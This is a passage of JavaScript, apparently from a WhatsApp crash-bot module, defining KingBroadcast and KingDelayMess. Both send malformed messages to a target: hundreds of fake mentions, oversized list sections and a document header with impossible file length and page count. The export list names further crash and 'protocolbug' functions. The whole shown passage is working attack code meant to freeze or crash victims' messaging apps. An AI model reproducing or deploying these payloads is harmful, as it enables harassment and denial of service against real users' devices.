  }
}

// ===================== KING BROADCAST =====================
async function KingBroadcast(client, target, mention = true) {
  try {
    // Réduction des mentions (500 au lieu de 5000)
    const mentions = Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

    const delaymention = Array.from({ length: 50 }, (_, r) => ({
      title: "𑇂".repeat(200),
      rows: [{ title: `📡 Broadcast ${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓͞⃟⏤͟͟͞͞͠🌹✦",
            listType: 2,
            buttonText: "⚡ DARKNESS ⚡",
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🔴" },
            contextInfo: { mentionedJid: mentions, remoteJid: "status@broadcast" }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});
    await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
      }, { messageId: msg.key.id });
    }
    console.log("✅ KingBroadcast envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingBroadcast:", err);
  }
}

// ===================== KING DELAY MESS =====================
async function KingDelayMess(client, target, Ptcp = true) {
  try {
    // Réduction des mentions (500 au lieu de 500)
    const mentions = Array.from({ length: 500 }, () => "15056662003@s.whatsapp.net");

    const payload = {
      ephemeralMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
                fileName: "kingbadboi.🌹DARKNESS",
                fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
                mediaKeyTimestamp: 1726867151,
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: { text: "⏤⃟͟𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒 ꙳𝐃𝐄𝐋𝐀𝐘͞⃟⏤͟͟͞͞͠🌹✦" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({ display_text: "DARKNESS CHANNEL", url: "https://youtube.com/@Darkness" })
                }
              ]
            },
            contextInfo: { mentionedJid: mentions }
          })
        }
      }
    };

    const msg = generateWAMessageFromContent(target, payload, {});
    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(Ptcp ? { participant: { jid: target } } : {})
    });
    console.log("✅ KingDelayMess envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingDelayMess:", err);
  }
}

module.exports = {
  carouselDelay,
  thunderblast_ios1,
  alldelay,
  callHome,
  carousels2,
  CarouselX,
  apaya,
  bulldozer,
  allProtocol,
  DelayInvisNew,
  superdelayinvid,
  delayCrash,
  protocolbug1,
  protocolbug2,
  protocolbug3,
  protocolbug6,
  protocolbug7,
  protocolbug8,
  KingBroadcast,
  KingDelayMess
}